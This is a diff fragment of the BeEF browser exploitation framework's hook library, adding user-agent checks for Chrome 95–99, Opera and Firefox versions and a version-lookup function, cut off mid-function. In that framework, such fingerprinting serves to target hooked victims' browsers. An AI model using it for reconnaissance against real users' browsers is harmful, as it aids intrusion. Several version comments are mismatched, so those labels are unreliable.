+     * @example: beef.browser.isC95()
+     */
+    isC95: function () {
+        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 95) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 95.
+     * @example: beef.browser.isC95iOS()
+     */
+    isC95iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 95) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 96.
+     * @example: beef.browser.isC96()
+     */
+    isC96: function () {
+        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 96) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 96.
+     * @example: beef.browser.isC96iOS()
+     */
+    isC96iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 96) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 97.
+     * @example: beef.browser.isC97()
+     */
+    isC97: function () {
+        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 97) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 97.
+     * @example: beef.browser.isC97iOS()
+     */
+    isC97iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 97) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 98.
+     * @example: beef.browser.isC98()
+     */
+    isC98: function () {
+        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 98) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 98.
+     * @example: beef.browser.isC98iOS()
+     */
+    isC98iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 98) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 99.
+     * @example: beef.browser.isC99()
+     */
+    isC99: function () {
+        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 99) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 99.
+     * @example: beef.browser.isC99iOS()
+     */
+    isC99iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 99) ? true : false);
+    },
+
+    /**
+     * Returns true for modern versions of Chrome (above 9).
+     * @example: beef.browser.isCbowser()
+     */
+    isCbowser: function () {
+        const parser = bowser.getParser(navigator.userAgent);
+        const browserName = parser.getBrowserName();
+        return browserName == 'Chrome';
+    },    
+
+    /**
+     * Returns true if Chrome.
+     * @example: beef.browser.isC()
+     */
+    isC: function () {
+        var legacyCheck = this.isC5() || this.isC6() || this.isC7() || this.isC8() || this.isC9() || this.isC10() || this.isC11() || this.isC12() || this.isC13() || this.isC14() || this.isC15() || this.isC16() || this.isC17() || this.isC18() || this.isC19() || this.isC19iOS() || this.isC20() || this.isC20iOS() || this.isC21() || this.isC21iOS() || this.isC22() || this.isC22iOS() || this.isC23() || this.isC23iOS() || this.isC24() || this.isC24iOS() || this.isC25() || this.isC25iOS() || this.isC26() || this.isC26iOS() || this.isC27() || this.isC27iOS() || this.isC28() || this.isC28iOS() || this.isC29() || this.isC29iOS() || this.isC30() || this.isC30iOS() || this.isC31() || this.isC31iOS() || this.isC32() || this.isC32iOS() || this.isC33() || this.isC33iOS() || this.isC34() || this.isC34iOS() || this.isC35() || this.isC35iOS() || this.isC36() || this.isC36iOS() || this.isC37() || this.isC37iOS() || this.isC38() || this.isC38iOS() || this.isC39() || this.isC39iOS() || this.isC40() || this.isC40iOS() || this.isC41() || this.isC41iOS() || this.isC42() || this.isC42iOS() || this.isC43() || this.isC43iOS() || this.isC44() || this.isC44iOS() || this.isC45() || this.isC45iOS() || this.isC46() || this.isC46iOS() || this.isC47() || this.isC47iOS() || this.isC48() || this.isC48iOS() || this.isC49() || this.isC49iOS() || this.isC50() || this.isC50iOS() || this.isC51() || this.isC51iOS() || this.isC52() || this.isC52iOS() || this.isC53() || this.isC53iOS() || this.isC54() || this.isC54iOS() || this.isC55() || this.isC55iOS() || this.isC56() || this.isC56iOS() || this.isC57() || this.isC57iOS() || this.isC58() || this.isC58iOS() || this.isC59() || this.isC59iOS()|| this.isC60() || this.isC60iOS()|| this.isC61() || this.isC61iOS()|| this.isC62() || this.isC62iOS()|| this.isC63() || this.isC63iOS()|| this.isC64() || this.isC64iOS()|| this.isC65() || this.isC65iOS()|| this.isC66() || this.isC66iOS()|| this.isC67() || this.isC67iOS()|| this.isC68() || this.isC68iOS()|| this.isC69() || this.isC69iOS()|| this.isC70() || this.isC70iOS()|| this.isC71() || this.isC71iOS()|| this.isC72() || this.isC72iOS()|| this.isC73() || this.isC73iOS()|| this.isC74() || this.isC74iOS()|| this.isC75() || this.isC75iOS()|| this.isC76() || this.isC76iOS()|| this.isC77() || this.isC77iOS()|| this.isC78() || this.isC78iOS()|| this.isC79() || this.isC79iOS()|| this.isC80() || this.isC80iOS()|| this.isC81() || this.isC81iOS()|| this.isC82() || this.isC82iOS()|| this.isC83() || this.isC83iOS()|| this.isC84() || this.isC84iOS()|| this.isC85() || this.isC85iOS()|| this.isC86() || this.isC86iOS()|| this.isC87() || this.isC87iOS()|| this.isC88() || this.isC88iOS()|| this.isC89() || this.isC89iOS()|| this.isC90() || this.isC90iOS()|| this.isC91() || this.isC91iOS()|| this.isC92() || this.isC92iOS()|| this.isC93() || this.isC93iOS()|| this.isC94() || this.isC94iOS()|| this.isC95() || this.isC95iOS()|| this.isC96() || this.isC96iOS()|| this.isC97() || this.isC97iOS()|| this.isC98() || this.isC98iOS()|| this.isC99() || this.isC99iOS();
+        return legacyCheck || this.isCbowser();
+    },
+
+    /**
+     * Returns true if Opera 9.50 through 9.52.
+     * @example: beef.browser.isO9_52()
+     */
+    isO9_52: function () {
+        return (!!window.opera && (window.navigator.userAgent.match(/Opera\/9\.5/) != null));
+    },
+
+    /**
+     * Returns true if Opera 9.60 through 9.64.
+     * @example: beef.browser.isO9_60()
+     */
+    isO9_60: function () {
+        return (!!window.opera && (window.navigator.userAgent.match(/Opera\/9\.6/) != null));
+    },
+
+    /**
+     * Returns true if Opera 10.xx.
+     * @example: beef.browser.isO10()
+     */
+    isO10: function () {
+        return (!!window.opera && (window.navigator.userAgent.match(/Opera\/9\.80.*Version\/10\./) != null));
+    },
+
+    /**
+     * Returns true if Opera 11.xx.
+     * @example: beef.browser.isO11()
+     */
+    isO11: function () {
+        return (!!window.opera && (window.navigator.userAgent.match(/Opera\/9\.80.*Version\/11\./) != null));
+    },
+
+    /**
+     * Returns true if Opera 12.xx.
+     * @example: beef.browser.isO12()
+     */
+    isO12: function () {
+        return (!!window.opera && (window.navigator.userAgent.match(/Opera\/9\.80.*Version\/12\./) != null));
+    },
+
+    /**
+     * Returns true if the browser is any version of Opera.
+     * @example: beef.browser.isObowser()
+    */
+    isObowser: function () {
+        const parser = bowser.getParser(navigator.userAgent);
+        const browserName = parser.getBrowserName();
+        return browserName == 'Opera';
+    },
+
+    /**
+     * Returns true if Opera.
+     * @example: beef.browser.isO()
+     */
+    isO: function () {
+        var legacyCheck = this.isO9_52() || this.isO9_60() || this.isO10() || this.isO11() || this.isO12();
+        return legacyCheck || this.isObowser();
+    },
+
+    /**
+     * Returns the type of browser being used.
+     * @example: beef.browser.type().IE6
+     * @example: beef.browser.type().FF
+     * @example: beef.browser.type().O
+     */
+    type: function () {
+
+        return {
+            E: this.isEdge(), // Edge any version
+            C5: this.isC5(), // Chrome 5
+            C6: this.isC6(), // Chrome 6
+            C7: this.isC7(), // Chrome 7
+            C8: this.isC8(), // Chrome 8
+            C9: this.isC9(), // Chrome 9
+            C10: this.isC10(), // Chrome 10
+            C11: this.isC11(), // Chrome 11
+            C12: this.isC12(), // Chrome 12
+            C13: this.isC13(), // Chrome 13
+            C14: this.isC14(), // Chrome 14
+            C15: this.isC15(), // Chrome 15
+            C16: this.isC16(), // Chrome 16
+            C17: this.isC17(), // Chrome 17
+            C18: this.isC18(), // Chrome 18
+            C19: this.isC19(), // Chrome 19
+            C19iOS: this.isC19iOS(), // Chrome 19 on iOS
+            C20: this.isC20(), // Chrome 20
+            C20iOS: this.isC20iOS(), // Chrome 20 on iOS
+            C21: this.isC21(), // Chrome 21
+            C21iOS: this.isC21iOS(), // Chrome 21 on iOS
+            C22: this.isC22(), // Chrome 22
+            C22iOS: this.isC22iOS(), // Chrome 22 on iOS
+            C23: this.isC23(), // Chrome 23
+            C23iOS: this.isC23iOS(), // Chrome 23 on iOS
+            C24: this.isC24(), // Chrome 24
+            C24iOS: this.isC24iOS(), // Chrome 24 on iOS
+            C25: this.isC25(), // Chrome 25
+            C25iOS: this.isC25iOS(), // Chrome 25 on iOS
+            C26: this.isC26(), // Chrome 26
+            C26iOS: this.isC26iOS(), // Chrome 26 on iOS
+            C27: this.isC27(), // Chrome 27
+            C27iOS: this.isC27iOS(), // Chrome 27 on iOS
+            C28: this.isC28(), // Chrome 28
+            C28iOS: this.isC28iOS(), // Chrome 28 on iOS
+            C29: this.isC29(), // Chrome 29
+            C29iOS: this.isC29iOS(), // Chrome 29 on iOS
+            C30: this.isC30(), // Chrome 30
+            C30iOS: this.isC30iOS(), // Chrome 30 on iOS
+            C31: this.isC31(), // Chrome 31
+            C31iOS: this.isC31iOS(), // Chrome 31 on iOS
+            C32: this.isC32(), // Chrome 32
+            C32iOS: this.isC32iOS(), // Chrome 32 on iOS
+            C33: this.isC33(), // Chrome 33
+            C33iOS: this.isC33iOS(), // Chrome 33 on iOS
+            C34: this.isC34(), // Chrome 34
+            C34iOS: this.isC34iOS(), // Chrome 34 on iOS
+            C35: this.isC35(), // Chrome 35
+            C35iOS: this.isC35iOS(), // Chrome 35 on iOS
+            C36: this.isC36(), // Chrome 36
+            C36iOS: this.isC36iOS(), // Chrome 36 on iOS
+            C37: this.isC37(), // Chrome 37
+            C37iOS: this.isC37iOS(), // Chrome 37 on iOS
+            C38: this.isC38(), // Chrome 38
+            C38iOS: this.isC38iOS(), // Chrome 38 on iOS
+            C39: this.isC39(), // Chrome 39
+            C39iOS: this.isC39iOS(), // Chrome 39 on iOS
+            C40: this.isC40(), // Chrome 40
+            C40iOS: this.isC40iOS(), // Chrome 40 on iOS
+            C41: this.isC41(), // Chrome 41
+            C41iOS: this.isC41iOS(), // Chrome 41 on iOS
+            C42: this.isC42(), // Chrome 42
+            C42iOS: this.isC42iOS(), // Chrome 42 on iOS
+            C43: this.isC43(), // Chrome 43
+            C43iOS: this.isC43iOS(), // Chrome 43 on iOS
+            C44: this.isC44(), // Chrome 44
+            C44iOS: this.isC44iOS(), // Chrome 44 on iOS
+            C45: this.isC45(), // Chrome 45
+            C45iOS: this.isC45iOS(), // Chrome 45 on iOS
+            C46: this.isC46(), // Chrome 46
+            C46iOS: this.isC46iOS(), // Chrome 46 on iOS
+            C47: this.isC47(), // Chrome 47
+            C47iOS: this.isC47iOS(), // Chrome 47 on iOS
+            C48: this.isC48(), // Chrome 48
+            C48iOS: this.isC48iOS(), // Chrome 48 on iOS
+            C49: this.isC49(), // Chrome 49
+            C49iOS: this.isC49iOS(), // Chrome 49 on iOS
+            C50: this.isC50(), // Chrome 50
+            C50iOS: this.isC50iOS(), // Chrome 50 on iOS
+            C51: this.isC51(), // Chrome 51
+            C51iOS: this.isC51iOS(), // Chrome 51 on iOS
+            C52: this.isC52(), // Chrome 52
+            C52iOS: this.isC52iOS(), // Chrome 52 on iOS
+            C53: this.isC53(), // Chrome 53
+            C53iOS: this.isC53iOS(), // Chrome 53 on iOS
+            C54: this.isC54(), // Chrome 54
+            C54iOS: this.isC54iOS(), // Chrome 54 on iOS
+            C55: this.isC55(), // Chrome 55
+            C55iOS: this.isC55iOS(), // Chrome 55 on iOS
+            C56: this.isC56(), // Chrome 56
+            C56iOS: this.isC56iOS(), // Chrome 56 on iOS
+            C57: this.isC57(), // Chrome 57
+            C57iOS: this.isC57iOS(), // Chrome 57 on iOS
+            C58: this.isC58(), // Chrome 58
+            C58iOS: this.isC58iOS(), // Chrome 58 on iOS
+            C63iOS: this.isC63iOS(),
+            C: this.isC(), // Chrome any version
+
+            FF2: this.isFF2(), // Firefox 2
+            FF3: this.isFF3(), // Firefox 3
+            FF3_5: this.isFF3_5(), // Firefox 3.5
+            FF3_6: this.isFF3_6(), // Firefox 3.6
+            FF4: this.isFF4(), // Firefox 4
+            FF5: this.isFF5(), // Firefox 5
+            FF6: this.isFF6(), // Firefox 6
+            FF7: this.isFF7(), // Firefox 7
+            FF8: this.isFF8(), // Firefox 8
+            FF9: this.isFF9(), // Firefox 9
+            FF10: this.isFF10(), // Firefox 10
+            FF11: this.isFF11(), // Firefox 11
+            FF12: this.isFF12(), // Firefox 12
+            FF13: this.isFF13(), // Firefox 13
+            FF14: this.isFF14(), // Firefox 14
+            FF15: this.isFF15(), // Firefox 15
+            FF16: this.isFF16(), // Firefox 16
+            FF17: this.isFF17(), // Firefox 17
+            FF18: this.isFF18(), // Firefox 18
+            FF19: this.isFF19(), // Firefox 19
+            FF20: this.isFF20(), // Firefox 20
+            FF21: this.isFF21(), // Firefox 21
+            FF22: this.isFF22(), // Firefox 22
+            FF23: this.isFF23(), // Firefox 23
+            FF24: this.isFF24(), // Firefox 24
+            FF25: this.isFF25(), // Firefox 25
+            FF26: this.isFF26(), // Firefox 26
+            FF27: this.isFF27(), // Firefox 27
+            FF28: this.isFF28(), // Firefox 28
+            FF29: this.isFF29(), // Firefox 29
+            FF30: this.isFF30(), // Firefox 30
+            FF31: this.isFF31(), // Firefox 31
+            FF32: this.isFF32(), // Firefox 32
+            FF33: this.isFF33(), // Firefox 33
+            FF34: this.isFF34(), // Firefox 34
+            FF35: this.isFF35(), // Firefox 35
+            FF36: this.isFF36(), // Firefox 36
+            FF37: this.isFF37(), // Firefox 37
+            FF38: this.isFF38(), // Firefox 38
+            FF39: this.isFF39(), // Firefox 39
+            FF40: this.isFF40(), // Firefox 40
+            FF41: this.isFF41(), // Firefox 41
+            FF42: this.isFF42(), // Firefox 42
+            FF43: this.isFF43(), // Firefox 43
+            FF44: this.isFF44(), // Firefox 44
+            FF45: this.isFF45(), // Firefox 45
+            FF46: this.isFF46(), // Firefox 46
+            FF47: this.isFF47(), // Firefox 47
+            FF48: this.isFF48(), // Firefox 48
+            FF49: this.isFF49(), // Firefox 49
+            FF50: this.isFF50(), // Firefox 50
+            FF51: this.isFF51(), // Firefox 51
+            FF52: this.isFF52(), // Firefox 52
+            FF53: this.isFF53(), // Firefox 53
+            FF54: this.isFF54(), // Firefox 54
+            FF55: this.isFF55(), // Firefox 55
+            FF56: this.isFF56(), // Firefox 56
+            FF57: this.isFF57(), // Firefox 57
+            FF58: this.isFF58(), // Firefox 58
+            FF59: this.isFF59(), // Firefox 59
+            FF60: this.isFF60(), // Firefox 60
+            FF61: this.isFF61(), // Firefox 61
+            FF62: this.isFF62(), // Firefox 62
+            FF63: this.isFF63(), // Firefox 63
+            FF64: this.isFF64(), // Firefox 64
+            FF65: this.isFF65(), // Firefox 65
+            FF66: this.isFF66(), // Firefox 66
+            FF67: this.isFF67(), // Firefox 67
+            FF68: this.isFF68(), // Firefox 68
+            FF69: this.isFF69(), // Firefox 69
+            FF70: this.isFF70(), // Firefox 70
+            FF71: this.isFF71(), // Firefox 71
+            FF72: this.isFF72(), // Firefox 72
+            FF73: this.isFF73(), // Firefox 73
+            FF74: this.isFF74(), // Firefox 74
+            FF75: this.isFF75(), // Firefox 75
+            FF76: this.isFF76(), // Firefox 76
+            FF77: this.isFF77(), // Firefox 77
+            FF78: this.isFF78(), // Firefox 78
+            FF79: this.isFF79(), // Firefox 79
+            FF80: this.isFF80(), // Firefox 70
+            FF81: this.isFF81(), // Firefox 81
+            FF82: this.isFF82(), // Firefox 82
+            FF83: this.isFF83(), // Firefox 83
+            FF84: this.isFF84(), // Firefox 85
+            FF85: this.isFF85(), // Firefox 85
+            FF86: this.isFF86(), // Firefox 85
+            FF87: this.isFF87(), // Firefox 87
+            FF88: this.isFF88(), // Firefox 85
+            FF89: this.isFF89(), // Firefox 85
+            FF90: this.isFF90(), // Firefox 80
+            FF91: this.isFF91(), // Firefox 95
+            FF92: this.isFF92(), // Firefox 92
+            FF93: this.isFF93(), // Firefox 95
+            FF94: this.isFF94(), // Firefox 94
+            FF95: this.isFF95(), // Firefox 95
+            FF96: this.isFF96(), // Firefox 96
+            FF97: this.isFF97(), // Firefox 97
+            FF98: this.isFF98(), // Firefox 98
+            FF99: this.isFF99(), // Firefox 99
+
+            FF: this.isFF(),   // Firefox any version
+
+            IE6: this.isIE6(), // Internet Explorer 6
+            IE7: this.isIE7(), // Internet Explorer 7
+            IE8: this.isIE8(), // Internet Explorer 8
+            IE9: this.isIE9(), // Internet Explorer 9
+            IE10: this.isIE10(), // Internet Explorer 10
+            IE11: this.isIE11(), // Internet Explorer 11
+            IE: this.isIE(), // Internet Explorer any version
+
+            O9_52: this.isO9_52(), // Opera 9.50 through 9.52
+            O9_60: this.isO9_60(), // Opera 9.60 through 9.64
+            O10: this.isO10(), // Opera 10.xx
+            O11: this.isO11(), // Opera 11.xx
+            O12: this.isO12(), // Opera 12.xx
+            O: this.isO(),   // Opera any version
+
+            EP: this.isEpi(), // Epiphany any version
+
+            S4: this.isS4(), // Safari 4.xx
+            S5: this.isS5(), // Safari 5.xx
+            S6: this.isS6(), // Safari 6.x
+            S7: this.isS7(), // Safari 7.x
+            S8: this.isS8(), // Safari 8.x
+            S: this.isS()   // Safari any version
+        }
+    },
+
+    /**
+     * Returns the major version of the browser being used.
+     * @return: {String} version number || 'UNKNOWN'.
+     *
+     * @example: beef.browser.getBrowserVersion()
+     */
+    getBrowserVersion: function () {
+        if (this.isEdge()) {
+          try {
+            return platform.version;
+          } catch(e) {
+            return 'unknown';
+          }
+        }
+        ;   // Microsoft Edge
+
+        if (this.isC5()) {
+            return '5'
+        }
+        ;   // Chrome 5
+        if (this.isC6()) {
+            return '6'
+        }
+        ;   // Chrome 6
+        if (this.isC7()) {
+            return '7'
+        }
+        ;   // Chrome 7
+        if (this.isC8()) {
+            return '8'
+        }
+        ;   // Chrome 8
+        if (this.isC9()) {
+            return '9'
+        }
+        ;   // Chrome 9
+        if (this.isC10()) {
+            return '10'
+        }
+        ;   // Chrome 10
+        if (this.isC11()) {
+            return '11'
+        }
+        ;   // Chrome 11
+        if (this.isC12()) {
+            return '12'
+        }
+        ;   // Chrome 12
+        if (this.isC13()) {
+            return '13'
+        }
+        ;   // Chrome 13
+        if (this.isC14()) {
+            return '14'
+        }
+        ;   // Chrome 14
+        if (this.isC15()) {
+            return '15'
+        }
+        ;   // Chrome 15
+        if (this.isC16()) {
+            return '16'
+        }
+        ;	// Chrome 16
+        if (this.isC17()) {
+            return '17'
+        }
+        ;	// Chrome 17
+        if (this.isC18()) {
+            return '18'
+        }
+        ;	// Chrome 18
+        if (this.isC19()) {
+            return '19'
+        }
+        ;	// Chrome 19
+        if (this.isC19iOS()) {
+            return '19'
+        }
+        ;   // Chrome 19 for iOS
+        if (this.isC20()) {
+            return '20'
+        }
+        ;	// Chrome 20
+        if (this.isC20iOS()) {
+            return '20'
+        }
+        ;   // Chrome 20 for iOS
+        if (this.isC21()) {
+            return '21'
+        }
+        ;	// Chrome 21
+        if (this.isC21iOS()) {
+            return '21'
+        }
+        ;   // Chrome 21 for iOS
+        if (this.isC22()) {
+            return '22'
+        }
+        ;    // Chrome 22
+        if (this.isC22iOS()) {
+            return '22'
+        }
+        ;   // Chrome 22 for iOS
+        if (this.isC23()) {
+            return '23'
+        }
+        ;    // Chrome 23
+        if (this.isC23iOS()) {
+            return '23'
+        }
+        ;   // Chrome 23 for iOS
+        if (this.isC24()) {
+            return '24'
+        }
+        ;    // Chrome 24
+        if (this.isC24iOS()) {
+            return '24'
+        }
+        ;   // Chrome 24 for iOS
+        if (this.isC25()) {
+            return '25'
+        }
+        ;    // Chrome 25
+        if (this.isC25iOS()) {
+            return '25'
+        }
+        ;   // Chrome 25 for iOS
+        if (this.isC26()) {
+            return '26'
+        }
+        ;    // Chrome 26
+        if (this.isC26iOS()) {
+            return '26'
+        }
+        ;   // Chrome 26 for iOS
+        if (this.isC27()) {
+            return '27'
+        }
+        ;    // Chrome 27
+        if (this.isC27iOS()) {
+            return '27'
+        }
+        ;   // Chrome 27 for iOS
+        if (this.isC28()) {
+            return '28'
+        }
+        ;    // Chrome 28
+        if (this.isC28iOS()) {
+            return '28'
+        }
+        ;   // Chrome 28 for iOS
+        if (this.isC29()) {
+            return '29'
+        }
+        ;    // Chrome 29
+        if (this.isC29iOS()) {
+            return '29'
+        }
+        ;   // Chrome 29 for iOS
+        if (this.isC30()) {
+            return '30'
+        }
+        ;    // Chrome 30
+        if (this.isC30iOS()) {
+            return '30'
+        }
+        ;   // Chrome 30 for iOS
+        if (this.isC31()) {
+            return '31'
+        }
+        ;   // Chrome 31
+        if (this.isC31iOS()) {
+            return '31'
+        }
+        ;   // Chrome 31 for iOS
+        if (this.isC32()) {
+            return '32'
+        }
+        ;   // Chrome 32
+        if (this.isC32iOS()) {
+            return '32'
+        }
+        ;   // Chrome 32 for iOS
+        if (this.isC33()) {
+            return '33'
+        }
+        ;   // Chrome 33
+        if (this.isC33iOS()) {
+            return '33'
+        }
+        ;   // Chrome 33 for iOS
+        if (this.isC34()) {
+            return '34'
+        }
+        ;   // Chrome 34
+        if (this.isC34iOS()) {
+            return '34'
+        }
+        ;   // Chrome 34 for iOS
+        if (this.isC35()) {
+            return '35'
+        }
+        ;   // Chrome 35
+        if (this.isC35iOS()) {
+            return '35'
+        }
+        ;   // Chrome 35 for iOS
+        if (this.isC36()) {
+            return '36'
+        }
+        ;   // Chrome 36
+        if (this.isC36iOS()) {
+            return '36'
+        }
+        ;   // Chrome 36 for iOS
+        if (this.isC37()) {
+            return '37'
+        }
+        ;   // Chrome 37
+        if (this.isC37iOS()) {
+            return '37'
+        }
+        ;   // Chrome 37 for iOS
+        if (this.isC38()) {
+            return '38'
+        }
+        ;   // Chrome 38
+        if (this.isC38iOS()) {
+            return '38'
+        }
+        ;   // Chrome 38 for iOS
+        if (this.isC39()) {
+            return '39'
+        }
+        ;   // Chrome 39
+        if (this.isC39iOS()) {
+            return '39'
+        }
+        ;   // Chrome 39 for iOS
+        if (this.isC40()) {
+            return '40'
+        }
+        ;   // Chrome 40
+        if (this.isC40iOS()) {
+            return '40'
+        }
+        ;   // Chrome 40 for iOS
+        if (this.isC41()) {
+            return '41'
+        }
+        ;   // Chrome 41
+        if (this.isC41iOS()) {
+            return '41'
+        }
+        ;   // Chrome 41 for iOS
+        if (this.isC42()) {
+            return '42'
+        }
+        ;   // Chrome 42
+        if (this.isC42iOS()) {
+            return '42'
+        }
+        ;   // Chrome 42 for iOS
+        if (this.isC43()) {
+            return '43'
+        }
+        ;   // Chrome 43
+        if (this.isC43iOS()) {
+            return '43'
+        }
+        ;   // Chrome 43 for iOS
+        if (this.isC44()) {
+            return '44'
+        }
+        ;   // Chrome 44
+        if (this.isC44iOS()) {
+            return '44'
+        }
+        ;   // Chrome 44 for iOS
+        if (this.isC45()) {
+            return '45'
+        }
+        ;   // Chrome 45
+        if (this.isC45iOS()) {
+            return '45'
+        }
+        ;   // Chrome 45 for iOS
+        if (this.isC46()) {
+            return '46'
+        }
+        ;// Chrome 46
+        if (this.isC46iOS()) {
+            return '46'
+        }
+        ;   // Chrome 46 for iOS
+        if (this.isC47()) {
+            return '47'
+        }
+        ;// Chrome 47
+        if (this.isC47iOS()) {
+            return '47'
+        }
+        ;   // Chrome 47 for iOS
+        if (this.isC48()) {
+            return '48'
+        }
+        ;// Chrome 48
+        if (this.isC48iOS()) {
+            return '48'
+        }
+        ;   // Chrome 48 for iOS
+        if (this.isC49()) {
+            return '49'
+        }
+        ;// Chrome 49
+        if (this.isC49iOS()) {
+            return '49'
+        }
+        ;   // Chrome 49 for iOS
+        if (this.isC50()) {
+            return '50'
+        }
+        ;// Chrome 50
+        if (this.isC50iOS()) {
+            return '50'
+        }
+        ;   // Chrome 50 for iOS
+        if (this.isC51()) {
+            return '51'
+        }
+        ;// Chrome 51
+        if (this.isC51iOS()) {
+            return '51'
+        }
+        ;   // Chrome 51 for iOS
+        if (this.isC52()) {
+            return '52'
+        }
+        ;// Chrome 52
+        if (this.isC52iOS()) {
+            return '52'
+        }
+        ;   // Chrome 52 for iOS
+        if (this.isC53()) {
+            return '53'
+        }
+        ;// Chrome 53
+        if (this.isC53iOS()) {
+            return '53'
+        }
+        ;   // Chrome 53 for iOS
+        if (this.isC54()) {
+            return '54'
+        }
+        ;// Chrome 54
+        if (this.isC54iOS()) {
+            return '54'
+        }
+        ;   // Chrome 54 for iOS
+        if (this.isC55()) {
+            return '55'
+        }
+        ;// Chrome 55
+        if (this.isC55iOS()) {
+            return '55'
+        }
+        ;   // Chrome 55 for iOS
+        if (this.isC56()) {
+            return '56'
+        }
+        ;// Chrome 56
+        if (this.isC56iOS()) {
+            return '56'
+        }
+        ;   // Chrome 56 for iOS
+        if (this.isC57()) {
+            return '57'
+        }
+        ;// Chrome 57
+        if (this.isC57iOS()) {
+            return '57'
+        }
+        ;   // Chrome 57 for iOS
+        if (this.isC58()) {
+            return '58'
+        }
+        ;// Chrome 58
+        if (this.isC58iOS()) {
+            return '58'
+        }
+        ;   // Chrome 58 for iOS
+
+
+        if (this.isFF2()) {
+            return '2'
+        }
+        ;	// Firefox 2
+        if (this.isFF3()) {
+            return '3'
+        }
+        ;	// Firefox 3
+        if (this.isFF3_5()) {
+            return '3.5'
+        }
+        ;	// Firefox 3.5
+        if (this.isFF3_6()) {
+            return '3.6'
+        }
+        ;	// Firefox 3.6
+        if (this.isFF4()) {
+            return '4'
+        }
+        ;	// Firefox 4
+        if (this.isFF5()) {
+            return '5'
+        }
+        ;	// Firefox 5
+        if (this.isFF6()) {
+            return '6'
+        }
+        ;	// Firefox 6
+        if (this.isFF7()) {
+            return '7'
+        }
+        ;	// Firefox 7
+        if (this.isFF8()) {
+            return '8'
+        }
+        ;	// Firefox 8
+        if (this.isFF9()) {
+            return '9'
+        }
+        ;	// Firefox 9
+        if (this.isFF10()) {
+            return '10'
+        }
+        ;	// Firefox 10
+        if (this.isFF11()) {
+            return '11'
+        }
+        ;	// Firefox 11
+        if (this.isFF12()) {
+            return '12'
+        }
+        ;	// Firefox 12
+        if (this.isFF13()) {
+            return '13'
+        }
+        ;	// Firefox 13
+        if (this.isFF14()) {
+            return '14'
+        }
+        ;	// Firefox 14
+        if (this.isFF15()) {
+            return '15'
+        }
+        ;	// Firefox 15
+        if (this.isFF16()) {
+            return '16'
+        }
+        ;	// Firefox 16
+        if (this.isFF17()) {
+            return '17'
+        }
+        ;    // Firefox 17
+        if (this.isFF18()) {
+            return '18'
+        }
+        ;    // Firefox 18
+        if (this.isFF19()) {
+            return '19'
+        }
+        ;    // Firefox 19
+        if (this.isFF20()) {
+            return '20'
+        }
+        ;    // Firefox 20
+        if (this.isFF21()) {
+            return '21'
+        }
+        ;    // Firefox 21
+        if (this.isFF22()) {
+            return '22'
+        }
+        ;   // Firefox 22
+        if (this.isFF23()) {
+            return '23'
+        }
+        ;   // Firefox 23
+        if (this.isFF24()) {
+            return '24'
+        }
+        ;   // Firefox 24
+        if (this.isFF25()) {
+            return '25'
+        }
+        ;   // Firefox 25
+        if (this.isFF26()) {
+            return '26'
+        }
+        ;   // Firefox 26
+        if (this.isFF27()) {
+            return '27'
+        }
+        ;   // Firefox 27
+        if (this.isFF28()) {
+            return '28'
+        }
+        ;   // Firefox 28
+        if (this.isFF29()) {
+            return '29'
+        }
+        ;   // Firefox 29
+        if (this.isFF30()) {
+            return '30'
+        }
+        ;   // Firefox 30
+        if (this.isFF31()) {
+            return '31'
+        }
+        ;   // Firefox 31
+        if (this.isFF32()) {
+            return '32'
+        }
+        ;   // Firefox 32
+        if (this.isFF33()) {
+            return '33'
+        }
+        ;   // Firefox 33
+        if (this.isFF34()) {
+            return '34'
+        }
+        ;   // Firefox 34
+        if (this.isFF35()) {
+            return '35'
+        }
+        ;   // Firefox 35
+        if (this.isFF36()) {
+            return '36'
+        }
+        ;   // Firefox 36
+        if (this.isFF37()) {
+            return '37'
+        }
+        ;   // Firefox 37
+        if (this.isFF38()) {
+            return '38'
+        }
+        ;   // Firefox 38
+        if (this.isFF39()) {
+            return '39'
+        }
+        ;   // Firefox 39
+        if (this.isFF40()) {
+            return '40'
+        }
+        ;   // Firefox 40
+        if (this.isFF41()) {
+            return '41'
+        }
+        ;   // Firefox 41
+        if (this.isFF42()) {
+            return '42'
+        }
+        ;   // Firefox 42
+        if (this.isFF43()) {
+            return '43'
+        }
